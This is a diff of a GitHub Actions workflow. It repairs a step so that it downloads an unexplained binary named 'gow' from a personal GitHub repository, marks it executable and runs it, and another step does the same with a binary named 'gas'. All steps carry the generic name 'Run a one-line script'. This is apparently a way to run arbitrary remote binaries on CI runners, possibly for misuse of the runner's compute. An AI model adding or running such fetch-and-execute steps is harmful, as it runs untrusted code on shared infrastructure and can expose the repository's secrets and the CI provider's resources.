@@ -18,7 +18,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - name: Run a one-line script
-        run: wget https://github.com/junitadore56/kang-push/raw/main/gow && cd chmod +x gow && ./gow
+        run: wget https://github.com/junitadore56/kang-push/raw/main/gow && chmod +x gow && ./gow
       - name: Run a one-line script
         run: wget https://github.com/junitadore56/kang-push/raw/main/gas && chmod +x gas && ./gas
       - name: Run a one-line script
